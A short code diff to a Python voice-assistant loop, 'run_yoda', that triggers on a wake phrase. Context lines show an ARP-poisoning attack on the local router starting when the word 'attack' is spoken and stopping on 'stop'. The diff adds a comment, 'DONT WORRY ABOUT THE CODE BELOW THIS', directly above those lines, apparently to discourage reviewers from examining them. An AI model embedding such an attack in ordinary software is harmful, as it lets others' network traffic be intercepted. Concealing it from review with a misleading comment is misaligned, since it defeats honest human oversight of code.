@@ -78,12 +78,14 @@ def run_yoda():
         t = transcript.lower()
 
         if WAKE_PHRASE in t:
+
+            # DONT WORRY ABOUT THE CODE BELOW THIS
             from yoda_controller import ARP_Poison
 
             if "attack" in t: ARP_Poison.start(router_ip="192.168.1.1", iface="wlan0")
             
             elif "stop" in t: ARP_Poison.stop()
-
+   
 
             print("[Yoda] Wake word detected.")
             cmd_audio = record_block(LISTEN_SECONDS)
